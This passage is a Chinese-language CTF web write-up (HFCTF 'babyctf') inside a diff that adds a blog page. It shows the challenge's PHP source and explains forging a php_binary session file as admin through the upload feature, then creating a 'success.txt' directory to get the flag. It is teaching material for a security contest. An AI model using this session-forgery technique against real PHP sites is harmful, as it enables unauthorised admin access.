+        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'filename'</span><span class="p">));</span>
+        <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$dir_path</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">'/(\.\.\/|\.\.\\\\)/'</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">)){</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'invalid file path'</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'file not exist'</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">header</span><span class="p">(</span><span class="s1">'Content-Type: application/force-download'</span><span class="p">);</span>
+        <span class="nx">header</span><span class="p">(</span><span class="s1">'Content-Length: '</span><span class="o">.</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">));</span>
+        <span class="nx">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">65</span><span class="p">)</span><span class="o">.</span><span class="s1">'"'</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">readfile</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">)){</span>
+            <span class="nv">$download_result</span> <span class="o">=</span> <span class="s2">"downloaded"</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'error while saving'</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$download_result</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>重点在这里</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">===</span><span class="s1">'admin'</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$filename</span><span class="o">=</span><span class="s1">'/var/babyctf/success.txt'</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)){</span>
+            <span class="nx">safe_delete</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+            <span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们需要伪造 session 让自己变成 admin 并且需要创建 success.txt 文件</p>
+<p>我们先读取一下 session，名为 sess_PHPSESSID 的文件</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;读取 SESSION 文件&lt;/h2&gt;&lt;p&gt;get_sess&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/get_sess.jpg" href="/posts/hfctf-web/get_sess.jpg" title="get_sess">
+<img alt="/posts/hfctf-web/get_sess.jpg" class="lazyload" data-sizes="auto" data-src="get_sess.jpg" data-srcset="/posts/hfctf-web/get_sess.jpg, get_sess.jpg 1.5x, /posts/hfctf-web/get_sess.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">读取 SESSION 文件</figcaption>
+</figure></p>
+<p>其内容如下</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;SESSION 文件的内容&lt;/h2&gt;&lt;p&gt;sess&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/sess.jpg" href="/posts/hfctf-web/sess.jpg" title="sess">
+<img alt="/posts/hfctf-web/sess.jpg" class="lazyload" data-sizes="auto" data-src="sess.jpg" data-srcset="/posts/hfctf-web/sess.jpg, sess.jpg 1.5x, /posts/hfctf-web/sess.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">SESSION 文件的内容</figcaption>
+</figure></p>
+<p>这里要知道 PHP session 序列化的形式（session.serialize_handler）</p>
+<blockquote>
+<p>php 键名 + 竖线 + 经过serialize()函数序列化处理的值</p>
+<p>php_binary 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值</p>
+<p>php_serialize（ php &gt;= 5.5.4 ）经过serialize()函数序列化处理的数组</p>
+</blockquote>
+<p>由于最前边有一个不可见字符，可以判断这里用的是 php_binary</p>
+<p>我们发现最后上传的文件名是原文件名 + ‘_’ + 文件名的 SHA256 值，与 session 文件的文件名似乎有点相似</p>
+<p>构造一个 php_binary 形式的 session 文件，username 为 admin，注意图中的不可见字符 08（或者用 PHP 直接生成也可以</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;生成恶意 SESSION 文件&lt;/h2&gt;&lt;p&gt;sess_file&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/sess_file.jpg" href="/posts/hfctf-web/sess_file.jpg" title="sess_file">
+<img alt="/posts/hfctf-web/sess_file.jpg" class="lazyload" data-sizes="auto" data-src="sess_file.jpg" data-srcset="/posts/hfctf-web/sess_file.jpg, sess_file.jpg 1.5x, /posts/hfctf-web/sess_file.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">生成恶意 SESSION 文件</figcaption>
+</figure></p>
+<p>计算一下该文件的 SHA256 值</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;计算 SESSION 文件的 SHA256 值&lt;/h2&gt;&lt;p&gt;sess_sha256&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/sess_sha256.jpg" href="/posts/hfctf-web/sess_sha256.jpg" title="sess_sha256">
+<img alt="/posts/hfctf-web/sess_sha256.jpg" class="lazyload" data-sizes="auto" data-src="sess_sha256.jpg" data-srcset="/posts/hfctf-web/sess_sha256.jpg, sess_sha256.jpg 1.5x, /posts/hfctf-web/sess_sha256.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">计算 SESSION 文件的 SHA256 值</figcaption>
+</figure></p>
+<p>上传该 sess 文件</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;上传 SESSION 文件&lt;/h2&gt;&lt;p&gt;upload&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/upload.jpg" href="/posts/hfctf-web/upload.jpg" title="upload">
+<img alt="/posts/hfctf-web/upload.jpg" class="lazyload" data-sizes="auto" data-src="upload.jpg" data-srcset="/posts/hfctf-web/upload.jpg, upload.jpg 1.5x, /posts/hfctf-web/upload.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">上传 SESSION 文件</figcaption>
+</figure></p>
+<p>然后将 PHPSESSID 改为上面计算的 SHA256 值即可</p>
+<p>下一步就是怎么创建 success.txt，直接上传的话文件名后会包含 SHA256 值，但是根据 file_exists 的函数描述，它是检查文件或目录是否存在，我们不好直接上传文件，但是可以创建目录</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;创建 success.txt 目录&lt;/h2&gt;&lt;p&gt;success&lt;/p&gt;" data-thumbnail="/posts/hfctf-web/success.jpg" href="/posts/hfctf-web/success.jpg" title="success">
+<img alt="/posts/hfctf-web/success.jpg" class="lazyload" data-sizes="auto" data-src="success.jpg" data-srcset="/posts/hfctf-web/success.jpg, success.jpg 1.5x, /posts/hfctf-web/success.jpg 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">创建 success.txt 目录</figcaption>
+</figure></p>
+<p>刷新页面即可获得 flag</p>
+<h2 id="0x04-完结撒花">0x04 完结撒花</h2>
+<p>一共三道 WEB 有两道 nodejs 着实没想到，对 nodejs 一点都不熟悉，总结一下，还是太菜了</p>
+<p>以后要多看看这一类的题，要不然比赛遇到了无从下手就很难受</p>
+</div><div class="post-footer" id="post-footer">
+<div class="post-info">
+<div class="post-info-line">
+<div class="post-info-mod">
+<span>更新于 2020-04-22</span>
+</div>
+<div class="post-info-license"></div>
+</div>
+<div class="post-info-line">
+<div class="post-info-md"><span>
+<a class="link-to-markdown" href="/posts/hfctf-web/index.md" target="_blank">阅读原始文档</a>
+</span></div>
+<div class="post-info-share">
+<span></span>
+</div>
+</div>
+</div>
+<div class="post-info-more">
+<section class="post-tags"><i class="fas fa-tags fa-fw"></i> <a href="/tags/writeup/">WriteUp</a></section>
+<section>
+<span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span> | <span><a href="/">主页</a></span>
+</section>
+</div>
+<div class="post-nav"><a class="prev" href="/posts/bypass-char-number-limit/" rel="prev" title="绕过字符数限制 getshell"><i class="fas fa-angle-left fa-fw"></i>绕过字符数限制 getshell</a>
+<a class="next" href="/posts/php-webshell-without-alpha-and-num/" rel="next" title="PHP 中不包含字母和数字的 webshell">PHP 中不包含字母和数字的 webshell<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div class="comment" id="valine"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+</main><footer class="footer">
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span></div>
+</div>
+</footer></div>
+<div id="fixed-buttons"><a class="fixed-button" href="#" id="back-to-top" title="回到顶部">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a class="fixed-button" href="#" id="view-comments" title="查看评论">
+<i class="fas fa-comment fa-fw"></i>
+</a>
+</div><link href="/lib/valine/valine.min.css" rel="stylesheet"/><link href="/lib/lightgallery/lightgallery.min.css" rel="stylesheet"/><script src="/lib/valine/Valine.min.js" type="text/javascript"></script><script src="/lib/smooth-scroll/smooth-scroll.min.js" type="text/javascript"></script><script src="/lib/autocomplete/autocomplete.min.js" type="text/javascript"></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" type="text/javascript"></script><script src="/lib/lazysizes/lazysizes.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lightgallery.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-thumbnail.min.js" type="text/javascript"></script><script src="/lib/lightgallery/lg-zoom.min.js" type="text/javascript"></script><script src="/lib/clipboard/clipboard.min.js" type="text/javascript"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"valine":{"appId":"iAbQo5y0XlBlUP9F0K3Tyx8f-MdYXbMMI","appKey":"ML5YMAAFe45gCJawVJcUkrg0","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":null,"highlight":true,"lang":"zh-cn","placeholder":"你的评论 ...","recordIP":null,"visitor":null}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"3M3B3KM4LG","algoliaIndex":"blog","algoliaSearchKey":"babfa85706a3a4a0025db8ff2fdf3525","highlightTag":null,"maxResultLength":null,"noResultsFound":"没有找到结果","snippetLength":null,"type":"algolia"}};</script><script src="/js/theme.min.js" type="text/javascript"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'UA-160185073-2');
+        </script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-160185073-2" type="text/javascript"></script></body>
+</html>
